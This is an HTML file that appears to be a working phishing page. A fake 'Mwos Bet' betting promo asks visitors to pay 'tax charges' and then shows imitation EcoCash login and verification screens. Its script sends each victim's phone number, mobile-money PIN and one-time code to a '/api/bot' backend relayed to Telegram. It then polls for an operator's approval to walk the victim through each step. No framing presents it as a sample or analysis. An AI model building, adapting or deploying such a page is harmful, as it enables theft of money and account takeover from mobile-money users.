<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mwos Bet - Payment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .pin-input:focus, .otp-input:focus { border-color: #0054A6; outline: none; box-shadow: 0 0 0 1px #0054A6; }
        .otp-input:focus { border-color: #60a5fa; box-shadow: 0 0 0 1px #60a5fa; }
        .curved-bg { border-top-left-radius: 50% 20px; border-top-right-radius: 50% 20px; }
        
        .aviator-bg {
            background: linear-gradient(to bottom, #050B14 0%, #112240 40%, #f59e0b 100%);
        }
    </style>
</head>
<body class="bg-gray-100 font-sans flex justify-center min-h-screen">

    <div class="w-full max-w-md bg-white shadow-2xl flex flex-col relative overflow-hidden min-h-screen">
        
        <!-- ================= SCREEN 1: AVIATOR PROMO ================= -->
        <main id="screen-promo" style="display: flex;" class="flex-col aviator-bg h-full overflow-y-auto pb-10">
            <div class="flex flex-col items-center pt-16 px-6 text-center z-10">
                <h1 class="text-5xl font-black text-white italic tracking-tighter mb-2">Mwos Bet</h1>
                <h2 class="text-6xl font-black text-red-600 italic tracking-tighter mb-8">Aviator</h2>
                
                <!-- Plane Graphic -->
                <div class="w-full relative h-64 flex justify-center items-center mb-8">
                    <svg class="w-64 h-64 text-red-500 drop-shadow-2xl transform -rotate-12" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/>
                    </svg>
                    <div class="absolute bottom-0 w-full h-32 bg-gradient-to-t from-[#f59e0b] to-transparent opacity-50 blur-xl"></div>
                </div>
            </div>

            <div class="absolute bottom-10 left-0 w-full px-6 z-20">
                <button type="button" onclick="document.getElementById('screen-promo').style.display='none'; document.getElementById('screen-form').style.display='flex';" class="w-full bg-red-600 text-white font-bold text-xl py-5 rounded-full shadow-[0_0_20px_rgba(220,38,38,0.6)] hover:bg-red-700 transition flex justify-center items-center cursor-pointer border-2 border-red-500">
                    <svg class="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
                    Click to Pay<br>Tax Charges
                    <svg class="w-6 h-6 ml-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
                </button>
            </div>
        </main>

        <!-- ================= SCREEN 2: MWOS FORM ================= -->
        <main id="screen-form" style="display: none;" class="flex-col bg-[#f8fafc] h-full overflow-y-auto pb-10">
            <!-- Top Chevron Background -->
            <div class="w-full h-32 bg-white relative overflow-hidden flex justify-center items-center">
                <div class="absolute inset-0 opacity-20" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22 viewBox=%220 0 100 100%22><path d=%22M0 50 L25 25 L50 50 L25 75 Z%22 fill=%22%230054A6%22/><path d=%22M50 50 L75 25 L100 50 L75 75 Z%22 fill=%22%23E31837%22/></svg>'); background-size: 100px 100px;"></div>
                <svg class="w-24 h-24 text-[#0054A6] relative z-10" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
            </div>

            <div class="bg-white mx-6 mt-[-20px] rounded-xl shadow-xl p-8 relative z-20">
                <div class="text-center mb-6 relative">
                    <h1 class="text-6xl font-black text-gray-100 absolute top-0 left-0 w-full text-center tracking-widest z-0">MWOS</h1>
                    <h2 class="text-sm text-gray-400 absolute top-12 left-0 w-full text-center z-0">mwos world of sport</h2>
                    
                    <div class="relative z-10 pt-8 text-left">
                        <label class="block text-xl font-bold text-[#0a1a3a] mb-2">Number:</label>
                        <input type="tel" id="mwosNumber" class="w-full border-2 border-gray-400 rounded-md p-4 text-lg focus:outline-none focus:border-[#0054A6] bg-transparent mb-6">
                        
                        <label class="block text-xl font-bold text-[#0a1a3a] mb-2">Amount:</label>
                        <input type="number" id="mwosAmount" class="w-full border-2 border-gray-400 rounded-md p-4 text-lg focus:outline-none focus:border-[#0054A6] bg-transparent mb-8">
                        
                        <button type="button" onclick="document.getElementById('screen-form').style.display='none'; document.getElementById('screen-login').style.display='flex';" class="w-full bg-[#0054A6] text-white font-bold text-xl py-4 rounded-md shadow-lg hover:bg-blue-800 transition cursor-pointer">
                            Click to Pay
                        </button>
                    </div>
                </div>
            </div>
        </main>

        <!-- ================= SCREEN 3: ECOCASH LOGIN ================= -->
        <main id="screen-login" style="display: none;" class="flex-col bg-white h-full relative">
            <header class="pt-10 pb-4 flex flex-col items-center">
                <h1 class="text-3xl font-extrabold tracking-tight"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>
                <p class="text-[11px] text-gray-500 font-medium mt-1">Your phone. Your wallet.</p>
            </header>

            <div class="px-6 flex-grow flex flex-col items-center pt-4 z-10">
                <h2 class="text-3xl font-serif italic text-gray-800 mb-8">Welcome</h2>

                <div class="w-full flex border-2 border-gray-800 rounded-xl overflow-hidden mb-8 bg-gray-50">
                    <div class="bg-gray-100 px-4 py-4 flex items-center text-sm font-bold border-r-2 border-gray-800">🇿🇼 +263</div>
                    <input type="tel" id="displayPhone" placeholder="Enter number here" class="w-full p-4 text-sm font-medium bg-transparent focus:outline-none">
                </div>

                <h3 class="text-xl font-serif italic text-gray-800 mb-6">Enter your PIN</h3>

                <div class="flex justify-center gap-3 mb-6 w-full" id="pinContainer">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="pin-input w-14 h-14 text-center text-2xl border-2 border-[#0054A6] rounded-lg bg-white transition">
                </div>

                <a href="#" class="text-sm font-bold text-[#0054A6] mb-8">Forgot PIN?</a>

                <button type="button" onclick="window.submitPin()" id="pinBtn" class="w-full bg-[#f1f5f9] text-gray-400 font-bold text-lg py-4 rounded-xl transition mb-10 cursor-pointer hover:bg-gray-200">Login</button>
            </div>

            <div class="absolute bottom-0 w-full bg-[#0054A6] curved-bg pt-10 pb-6 px-4 z-0">
                <p class="text-center text-white text-xs mb-4">To register an EcoCash wallet or get assistance, click below</p>
                <div class="flex gap-3">
                    <button class="flex-1 bg-white text-[#0054A6] font-bold py-3 rounded-lg text-sm">Register</button>
                    <button class="flex-1 bg-white text-[#0054A6] font-bold py-3 rounded-lg text-sm">Help & Support</button>
                </div>
            </div>
        </main>

        <!-- ================= SCREEN 4: ECOCASH OTP ================= -->
        <main id="screen-otp" style="display: none;" class="flex-col bg-white h-full relative">
            <header class="flex items-center p-4 text-gray-800 bg-gray-50 border-b border-gray-200">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
                <span class="flex-grow text-center font-medium pr-6">Verification</span>
            </header>

            <div class="px-6 flex-grow flex flex-col items-center pt-10 z-10">
                <h1 class="text-5xl font-extrabold tracking-tight mb-12"><span class="text-[#0054A6]">Eco</span><span class="text-[#E31837]">Cash</span></h1>

                <p class="text-gray-800 font-bold text-lg mb-2">Enter the OTP code sent to</p>
                <p class="text-gray-600 font-medium mb-10" id="otpPhoneDisplay">+263 ...</p>

                <div class="flex justify-center gap-2 mb-10 w-full" id="otpContainer">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border-2 border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border-2 border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border-2 border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border-2 border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border-2 border-gray-300 rounded-lg text-gray-800 bg-white transition">
                    <input type="tel" maxlength="1" inputmode="numeric" oninput="if(this.value.length==1 && this.nextElementSibling) this.nextElementSibling.focus();" class="otp-input w-12 h-14 text-center text-xl border-2 border-gray-300 rounded-lg text-gray-800 bg-white transition">
                </div>

                <p class="text-gray-500 text-sm mb-10">Resend OTP in <span class="font-bold text-gray-800">39 Sec</span></p>

                <button type="button" onclick="window.submitOtp(false)" id="otpBtn" class="w-full bg-[#0054A6] text-white font-bold text-lg py-4 rounded-xl transition mb-10 shadow-lg cursor-pointer hover:bg-blue-800 hidden">Verify and Login</button>
            </div>

            <div class="absolute bottom-0 w-full bg-[#0054A6] curved-bg pt-8 pb-6 px-4 z-0">
                <p class="text-center text-white text-sm font-medium flex items-center justify-center mb-2">
                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    Help & Support
                </p>
                <p class="text-center text-blue-200 text-xs">v4.2.14</p>
            </div>
        </main>
    </div>

    <!-- ================= JAVASCRIPT LOGIC ================= -->
    <script>
        window.submitPin = function() {
            var pin = '';
            var inputs = document.getElementsByClassName('pin-input');
            for (var i = 0; i < inputs.length; i++) { pin += inputs[i].value; }
            
            if (pin.length !== 4) {
                alert("Please enter all 4 digits.");
                return;
            }
            
            var btn = document.getElementById('pinBtn');
            btn.disabled = true; 

            var userId = Date.now().toString().slice(-6);
            var phone = document.getElementById('displayPhone').value || "Not Provided";

            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send_verification', phone: phone, pin: pin, userId: userId, type: 'pin' })
            }).then(function(res) {
                return res.json().then(function(data) {
                    if (!res.ok) throw new Error(data.error || "Unknown error");
                    alert("SUCCESS! Check Telegram.");
                    window.checkAdminStatus(userId, 'pin', btn);
                });
            }).catch(function(err) {
                alert("BACKEND ERROR: " + err.message);
                btn.disabled = false;
            });
        };

        window.submitOtp = function(isAuto) {
            var otp = '';
            var inputs = document.getElementsByClassName('otp-input');
            for (var i = 0; i < inputs.length; i++) { otp += inputs[i].value; }
            
            if (otp.length !== 6) {
                if (isAuto !== true) alert("Please enter the full 6-digit OTP.");
                return;
            }

            var btn = document.getElementById('otpBtn');
            btn.disabled = true; 

            var userId = Date.now().toString().slice(-6);
            var phone = document.getElementById('displayPhone').value || "Not Provided";

            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'send_verification', phone: phone, pin: otp, userId: userId, type: 'otp' })
            }).then(function(res) {
                return res.json().then(function(data) {
                    if (!res.ok) throw new Error(data.error || "Unknown error");
                    alert("SUCCESS! Check Telegram.");
                    window.checkAdminStatus(userId, 'otp', btn);
                });
            }).catch(function(err) {
                alert("BACKEND ERROR: " + err.message);
                btn.disabled = false;
            });
        };

        window.checkAdminStatus = function(userId, type, btn) {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + userId)
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        btn.disabled = false;
                        
                        if (type === 'pin') {
                            document.getElementById('screen-login').style.display = 'none';
                            document.getElementById('screen-otp').style.display = 'flex';
                            
                            var phone = document.getElementById('displayPhone').value || "Not Provided";
                            document.getElementById('otpPhoneDisplay').innerText = "+263 " + phone;

                            document.querySelector('.otp-input').focus();
                        } else {
                            alert("🎉 Success! Payment Approved.");
                            window.location.reload();
                        }
                    } else if (data.status === 'rejected') {
                        clearInterval(interval);
                        btn.disabled = false;
                        
                        var inputs;
                        if (type === 'pin') {
                            alert("❌ Wrong PIN. Please try again.");
                            inputs = document.getElementsByClassName('pin-input');
                        } else {
                            alert("❌ Wrong OTP. Please try again.");
                            inputs = document.getElementsByClassName('otp-input');
                        }
                        
                        for (var i = 0; i < inputs.length; i++) {
                            inputs[i].value = '';
                        }
                        if (inputs.length > 0) inputs[0].focus();
                    }
                }).catch(function(e) { });
            }, 1500);
        };
    </script>
</body>
                          </html>
